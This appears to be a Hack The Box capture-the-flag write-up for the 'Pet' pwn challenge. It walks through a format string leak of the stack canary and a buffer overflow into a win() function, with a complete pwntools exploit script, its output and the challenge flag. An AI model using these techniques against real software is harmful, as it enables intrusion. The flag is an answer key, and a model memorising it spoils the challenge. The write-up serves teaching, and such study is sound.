# Pet :bird: 

## Description: 

* Every Agent needs to communicate with others Agents. We have some special pet-friends that help us with that. Just tell them the message and they will send it securely to the other Agents.  

## Objective: 

* Take advantage of a `format string bug` to leak the *canary* and *BoF* to call `win`.  

## Flag: :black_flag:
* `HTB{c4n4r13s_4r3_4g3nt5_b35t_fr13nd}`

### Difficulty:
* Medium

## Challenge:

The interface looks like this:

```console
$ ./pet 
Give your pet the message you want to send: w3t
Your message is: w3t
Is this your final choice?
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Mission failed! ❌
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
$ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: command not found
$ ./pet 
Give your pet the message you want to send: %p %p %p
Your message is: 0x7ffe47620300 0x7fe2b9c8a8c0 (nil)
Is this your final choice?
> yes
Mission failed! ❌
```

As we can see, a **stack smashing detected** message is displayed after entering some "A"s. That means that a possible *Buffer Overflow* that was stopped by **Canary** protection.

We run a `checksec` to verify this:
```console
$ checksec ./pet
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
* **Canary** is **on**.
* **PIE** is **off**. 

Let's open a disassembler and analyze the program.

### Disassembly :pick:

We start from `main()`:

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  char local_58 [32];
  undefined local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  memset(local_58,0,0x20);
  printf("Give your pet the message you want to send: ");
  read(0,local_58,0x1f);
  printf("Your message is: ");
  printf(local_58);
  printf("Is this your final choice?\n> ");
  read(0,local_38,0x3e);
  puts(&DAT_00400b95);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

We see 2 important things here:

* ` printf(local_58);` there is a `format string bug` here.
* `read(0,local_38,0x3e);` there is a **Buffer Overflow** here, because `read()` reads up to `0x3e` bytes and `local_38` is 40 bytes long.

Another thing we should take into consideration is this function: `win()`

```c
void win(void)

{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_38 [40];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  memset(local_38,0,0x25);
  __stream = fopen("./flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Error loading flag! Please contact the admin.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  puts("Congratulations Agent! Here is a gift for you:");
  fgets(local_38,0x25,__stream);
  fclose(__stream);
  puts(local_38);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

As we can see, this functions loads the flag and prints it to us. 

What we need to do:

* Leak `canary` with `format string bug`.
* Fill the buffer with junk.
* Overwrite the `canary` with our leaked `canary`.
* Overwrite the `return` address with `win`.

In order to leak the canary, we send some `%p`. **Canaries** end with `00` and are more than 8 bytes long, so they stand out easily from other values. A simple function can be created in order to find the register in which the canary can be found:

```python
def find():
	# Canary ends with 00
	context.log_level = 'error'
	for i in range(20):
		r = process(fname)
		r.sendlineafter(':', 'AAAA%{}$p'.format(i,i))
		r.recvuntil('AAAA')
		line = str(r.recvline()[:-1])[1:]
		if '00' in line and len(line) > 16:
			print('Possible canary: [{}] -> {}'.format(i,line))
		r.close()
```

This can be called while providing a command line argument:

```console
$ ./solver.py
[+] Opening connection to 172.17.0.1 on port 1337: Done
[*] 'challenge/pet'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './pet'
Possible canary: [15] -> '0x28c7f4a1ed483f00'
```

We see that the canary is at `$15`.

Now we have everything we need in order to construct our exploit.

### Exploit :scroll:

```python
#!/usr/bin/python3
from pwn import *
import sys

ip = '172.17.0.1' # change this
port = 1337 # change this
fname = './pet' # change this
context.arch = 'amd64'

LOCAL = False

if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

e = ELF(fname)
rop = ROP(e)

rl = lambda : r.recvline()
ru = lambda x : r.recvuntil(x)
sla = lambda x,y : r.sendlineafter(x,y)

def find():
	# Canary ends with 00
	context.log_level = 'error'
	for i in range(20):
		r = process(fname)
		r.sendlineafter(':', 'AAAA%{}$p'.format(i,i))
		r.recvuntil('AAAA')
		line = str(r.recvline()[:-1])[1:]
		if '00' in line and len(line) > 16:
			print('Possible canary: [{}] -> {}'.format(i,line))
		r.close()

def canary_leak():
	payload = '%15$p'
	sla(':', payload)
	ru(': ')
	return int(rl()[:-1],16)

def get_flag():
	ru('{')[:-1]
	flag = ru('}')
	print('Flag: HTB{' + flag.decode())

def pwn():
	junk = b'A'*40
	canary = canary_leak()
	print('Canary: 0x{:x}'.format(canary))
	payload = junk
	payload += p64(canary)
	payload += p64(rop.find_gadget(['ret'])[0])
	payload += p64(e.symbols['win'])
	sla('>', payload)
	get_flag()

if __name__ == '__main__':
	if len(sys.argv) == 2: 
		if sys.argv[1] == 'find':
			find()
	else:
		pwn()
```

### PoC: :checkered_flag:

```console
$ ./solver.py 
[+] Opening connection to 172.17.0.1 on port 1337: Done
[*] 'challenge/pet'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './pet'
Canary: 0x561704acb1e8c00
Flag: HTB{c4n4r13s_4r3_4g3nt5_b35t_fr13nd}
```
